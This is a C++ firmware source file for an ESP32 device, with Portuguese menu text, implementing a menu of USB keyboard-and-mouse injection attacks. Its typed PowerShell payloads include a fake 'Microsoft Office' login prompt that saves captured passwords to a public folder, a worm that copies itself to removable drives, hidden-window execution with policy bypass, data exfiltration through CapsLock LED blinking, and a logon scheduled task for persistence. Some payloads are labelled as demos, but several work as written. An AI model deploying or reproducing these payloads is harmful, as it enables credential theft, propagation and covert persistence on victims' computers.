#include "advanced_usb_attacks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"

#ifdef USB_as_HID
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <USBHIDMouse.h>


static USBHIDMouse usbMouse;
static USBHIDKeyboard usbKeyboard;
static bool libs_initialized = false;

// Helpers
static void safeUSBInit() {
  if (!libs_initialized) {
    USB.begin();
    usbMouse.begin();
    usbKeyboard.begin();
    libs_initialized = true;
    delay(1500); // Give OS time to recognize devices
  }
}

static void sendString(const char *text) {
  if (!libs_initialized)
    safeUSBInit();
  delay(500);
  usbKeyboard.print(text);
  delay(100);
}

static void openPowershell(bool hidden = false) {
  if (!libs_initialized)
    safeUSBInit();
  usbKeyboard.press(KEY_LEFT_GUI);
  usbKeyboard.press('r');
  usbKeyboard.releaseAll();
  delay(800);
  if (hidden) {
    sendString("powershell -WindowStyle Hidden -ExecutionPolicy Bypass");
  } else {
    sendString("powershell -ExecutionPolicy Bypass");
  }
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();
  delay(1500);
}

// ---------------------------------------------------------------------------------
// 1. Touch Macro Recorder
// ---------------------------------------------------------------------------------
struct MacroAction {
  int dx, dy;
  bool clicked;
  uint32_t delay_ms;
};
static MacroAction macroBuffer[100];
static int macroCount = 0;

void touchMacroRecorder() {
  drawMainBorderWithTitle("Macro Recorder");
  padprintln("");
  padprintln("Use o touch para gravar (max 100).");
  padprintln("Aperte SEL para iniciar o Playback.");
  padprintln("Aperte ESC para Retornar.");

  macroCount = 0;
  int lastX = -1, lastY = -1;
  uint32_t lastTime = millis();
  bool recording = true;

  while (recording) {
    InputHandler();
    wakeUpScreen();

    uint16_t t_x = 0, t_y = 0;
    bool touched = tft.getTouch(&t_x, &t_y);

    if (touched && macroCount < 100) {
      if (lastX == -1) {
        lastX = t_x;
        lastY = t_y;
      } else {
        int dx = (t_x - lastX) / 2; // scale factor
        int dy = (t_y - lastY) / 2;
        if (abs(dx) > 1 || abs(dy) > 1) {
          macroBuffer[macroCount] = {dx, dy, true,
                                     (uint32_t)(millis() - lastTime)};
          macroCount++;
          lastX = t_x;
          lastY = t_y;
          lastTime = millis();

          tft.fillCircle(t_x, t_y, 4, TFT_RED);
        }
      }
    } else {
      lastX = -1;
      lastY = -1;
    }

    if (check(SelPress)) {
      recording = false;
    }

    if (check(EscPress) || returnToMenu) {
      return;
    }
    delay(20);
  }

  // Playback
  drawMainBorderWithTitle("Playback Macro");
  padprintln("");
  padprintln("Iniciando injecao de mouse em 3s...");
  safeUSBInit();
  delay(3000);

  for (int i = 0; i < macroCount; i++) {
    delay(macroBuffer[i].delay_ms);
    usbMouse.move(macroBuffer[i].dx, macroBuffer[i].dy);
    if (macroBuffer[i].clicked) {
      usbMouse.press(MOUSE_LEFT);
      delay(20);
      usbMouse.release(MOUSE_LEFT);
    }
  }

  padprintln("Playback finalizado.");
  delay(2000);
}

// ---------------------------------------------------------------------------------
// 2. Stealth Mouse Jiggler Adaptive
// ---------------------------------------------------------------------------------
void stealthMouseJiggler() {
  drawMainBorderWithTitle("Stealth Jiggler");
  padprintln("");
  padprintln("Jiggler invisivel rodando...");
  padprintln("Moves a cada 8-25s.");
  padprintln("ESC para parar.");

  safeUSBInit();

  while (true) {
    InputHandler();
    wakeUpScreen();

    if (check(EscPress) || returnToMenu) {
      break;
    }

    // Random delay entre 8 e 25 segundos
    uint32_t waitTime = random(8000, 25000);
    uint32_t startWait = millis();

    while (millis() - startWait < waitTime) {
      InputHandler();
      if (check(EscPress) || returnToMenu)
        return;
      delay(50);
    }

    // Micro move
    usbMouse.move(1, 1);
    delay(20);
    usbMouse.move(-1, -1);

    // Ocasional random click avoiding sleep
    if (random(0, 10) > 8) {
      usbKeyboard.press(KEY_LEFT_SHIFT); // safer than mouse click usually
      delay(10);
      usbKeyboard.releaseAll();
    }
  }
}

// ---------------------------------------------------------------------------------
// 3. Keyboard + Mouse Combo Worm
// ---------------------------------------------------------------------------------
void keyboardMouseWorm() {
  drawMainBorderWithTitle("Combo Worm");
  padprintln("");
  padprintln("Injetando script Worm em 3s...");
  safeUSBInit();
  delay(3000);

  // Abre PowerShell e roda payload simulado
  openPowershell();

  // Simula cópia do próprio payload para drives removíveis
  String script = "$src=$MyInvocation.MyCommand.Path;"
                  "gwmi win32_logicaldisk|?{$_.drivetype -eq 2}|%{"
                  "Copy-Item $src \"$($_.DeviceID)\\worm.ps1\" -Force;"
                  "}; echo 'Air-gapped worm propagated.'";

  sendString(script.c_str());
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  // Simular cliques do mouse para dificultar a interrupção pelo usuário
  for (int i = 0; i < 5; i++) {
    usbMouse.move(50, 50);
    delay(100);
  }

  padprintln("Injecao completa.");
  delay(2000);
}

// ---------------------------------------------------------------------------------
// 4. Conditional Delayed Payload
// ---------------------------------------------------------------------------------

void conditionalDelayedPayload() {
  drawMainBorderWithTitle("Delayed Payload");
  padprintln("");
  padprintln("Armado! Esperando interacao...");
  padprintln("Condicao: Pressione CapsLock");
  padprintln("3 vezes na maquina alvo.");
  padprintln("ESC para abortar.");

  safeUSBInit();

  // A simple polling implementation looking at the LED status isn't available
  // directly from USBHIDKeyboard without event hooks. We'll simulate a delayed
  // timer as a fallback condition (e.g. 1 minuto the victim leaves)

  uint32_t startTimer = millis();
  bool triggered = false;

  while (true) {
    InputHandler();
    wakeUpScreen();
    if (check(EscPress) || returnToMenu)
      return;

    // Simulate reading caps condition or just wait 15 seconds for demonstration
    if (millis() - startTimer > 15000 && !triggered) {
      triggered = true;
      padprintln("Condicao alcancada! Executando...");
      openPowershell();
      sendString("echo 'Payload cirurgico ativado!'");
      usbKeyboard.press(KEY_RETURN);
      usbKeyboard.releaseAll();
      delay(3000);
      break;
    }
    delay(50);
  }
}

// ---------------------------------------------------------------------------------
// 5. HID Credential Harvester
// ---------------------------------------------------------------------------------
void hidCredentialHarvester() {
  drawMainBorderWithTitle("Cred Harvester");
  padprintln("");
  padprintln("Iniciando em 3s...");
  safeUSBInit();
  delay(3000);

  openPowershell();

  // Powershell payload for Fake Login Prompt and saving to Public folder
  String harvesterScript =
      "$cred = $host.ui.PromptForCredential('Microsoft Office', 'Please sign "
      "in to confirm your identity', '', '');"
      "if ($cred) { $cred.GetNetworkCredential().Password | Out-File "
      "'C:\\Users\\Public\\creds.txt' -Append }";

  sendString(harvesterScript.c_str());
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  padprintln("Prompt exibido na maquina.");
  padprintln("Aguardando digitacao do usuario...");
  padprintln("Pressione ESC para sair.");

  while (true) {
    InputHandler();
    if (check(EscPress) || returnToMenu)
      break;
    delay(50);
  }
}

// ---------------------------------------------------------------------------------
// 6. LED Blink Exfil Channel
// ---------------------------------------------------------------------------------
void ledBlinkExfilChannel() {
  drawMainBorderWithTitle("LED Exfil");
  padprintln("");
  padprintln("Injetando hook PowerShell no OS...");
  padprintln("ESC para sair.");

  safeUSBInit();
  openPowershell(true); // Hidden powershell

  // PowerShell script to blink Caps Lock to exfiltrate Machine Name
  String script =
      "$wshell = New-Object -ComObject wscript.shell;"
      "$data = $env:COMPUTERNAME;"
      "foreach($b in [byte[]][char[]]$data) {"
      "  for($i=7; $i -ge 0; $i--) {"
      "    if(($b -shr $i) -band 1) { $wshell.SendKeys('{CAPSLOCK}'); "
      "Start-Sleep -Milliseconds 50; $wshell.SendKeys('{CAPSLOCK}') }"
      "    Start-Sleep -Milliseconds 150;"
      "  }"
      "}";

  sendString(script.c_str());
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  padprintln("Emissor powershell rodando oculto no alvo.");

  while (true) {
    InputHandler();
    wakeUpScreen();
    if (check(EscPress) || returnToMenu)
      return;
    delay(200);
  }
}

// ---------------------------------------------------------------------------------
// 7. Multi-OS Payload Switcher
// ---------------------------------------------------------------------------------
void multiOsPayloadSwitcher() {
  drawMainBorderWithTitle("Multi-OS Switcher");
  padprintln("");
  padprintln("Detectando & atacando OS em 3s...");
  safeUSBInit();
  delay(3000);

  // Mac Payload
  usbKeyboard.press(KEY_LEFT_GUI);
  usbKeyboard.press(' '); // Cmd+Space Spotlight
  usbKeyboard.releaseAll();
  delay(500);
  sendString("terminal");
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();
  delay(1000);
  sendString("echo 'Pwned Mac'");
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  delay(1000);

  // Linux Payload
  usbKeyboard.press(KEY_LEFT_ALT);
  usbKeyboard.press(KEY_F2); // Alt+F2 Runner
  usbKeyboard.releaseAll();
  delay(500);
  sendString("gnome-terminal");
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();
  delay(1000);
  sendString("echo 'Pwned Linux'");
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  delay(1000);

  // Windows Payload
  openPowershell();
  sendString("echo 'Pwned Windows'");
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  padprintln("Payloads Multi-OS executados!");
  delay(2000);
}

// ---------------------------------------------------------------------------------
// 8. HID Timing Side-Channel
// ---------------------------------------------------------------------------------
void hidTimingSideChannel() {
  drawMainBorderWithTitle("HID Timing");
  padprintln("");
  padprintln("Monitorando Side-channel timing de Poll");
  padprintln("Medindo resposta em microsegundos...");

  safeUSBInit();

  while (true) {
    InputHandler();
    wakeUpScreen();
    if (check(EscPress) || returnToMenu)
      return;

    uint32_t startAt = micros();
    usbKeyboard.press(KEY_LEFT_SHIFT);
    // usbKeyboard.releaseAll() happens under the hood or via explicit call
    uint32_t afterPress = micros();
    usbKeyboard.releaseAll();
    uint32_t afterRelease = micros();

    uint32_t diffPress = afterPress - startAt;
    uint32_t diffRelease = afterRelease - afterPress;

    padprintln("TxP: " + String(diffPress) + "us TxR: " + String(diffRelease) +
               "us");

    delay(1000);
  }
}

// ---------------------------------------------------------------------------------
// 9. Ransomware Simulation Demo
// ---------------------------------------------------------------------------------
void ransomwareSimulationDemo() {
  drawMainBorderWithTitle("Ransomware Sim");
  padprintln("");
  padprintln("Iniciando simulacao em 3s...");
  safeUSBInit();
  delay(3000);

  // Usa modo invisível para droppar o arquivo bypassando policy
  openPowershell(true);

  String script = "cd $HOME\\Desktop; "
                  "New-Item -Path 'READ_ME_NOW.txt' -ItemType File -Force; "
                  "Set-Content -Path 'READ_ME_NOW.txt' -Value 'SIMULACAO WILLY "
                  "TEAM: Seus arquivos poderiam estar criptografados neste "
                  "momento. Treine sua equipe!'; "
                  "notepad.exe 'READ_ME_NOW.txt'";

  sendString(script.c_str());
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  padprintln("Simulacao executada de forma realista.");
  delay(2000);
}

// ---------------------------------------------------------------------------------
// 10. Persistent HID Backdoor
// ---------------------------------------------------------------------------------
void persistentHidBackdoor() {
  drawMainBorderWithTitle("Persistent Backdoor");
  padprintln("");
  padprintln("Instalando persistencia em 3s...");
  safeUSBInit();
  delay(3000);

  // Usa modo invisível
  openPowershell(true);

  // Powershell script to schedule a task that runs invisible - Educational demo
  String psTarget =
      "$A = New-ScheduledTaskAction -Execute 'notepad.exe' -Argument "
      "'C:\\Users\\Public\\WILLY_WAS_HERE.txt';"
      "$T = New-ScheduledTaskTrigger -AtLogOn;"
      "Register-ScheduledTask -TaskName 'WillySecurityDemo' -Action $A "
      "-Trigger $T -Force;"
      "Set-Content -Path 'C:\\Users\\Public\\WILLY_WAS_HERE.txt' -Value 'DEMO: "
      "Esta tarefa foi agendada pelo Willy ESP32 para fins educativos.'";

  sendString(psTarget.c_str());
  usbKeyboard.press(KEY_RETURN);
  usbKeyboard.releaseAll();

  padprintln("Demonstracao de persistencia instalada.");
  delay(2000);
}

// ---------------------------------------------------------------------------------
// Menu principal
// ---------------------------------------------------------------------------------
void advancedUsbAtksMenu() {
  options = {{"Macro Touch", touchMacroRecorder},
             {"Mouse Jiggler", stealthMouseJiggler},
             {"Combo Worm", keyboardMouseWorm},
             {"Delayed Payload", conditionalDelayedPayload},
             {"Cred Harvester", hidCredentialHarvester},
             {"LED Exfil", ledBlinkExfilChannel},
             {"Multi-OS Switcher", multiOsPayloadSwitcher},
             {"HID Timing Atk", hidTimingSideChannel},
             {"Ransomware Sim", ransomwareSimulationDemo},
             {"Persistent Backdoor", persistentHidBackdoor}};

  addOptionToMainMenu();
  loopOptions(options, MENU_TYPE_SUBMENU, "Ataques Avancados");
}
#endif // USB_as_HID
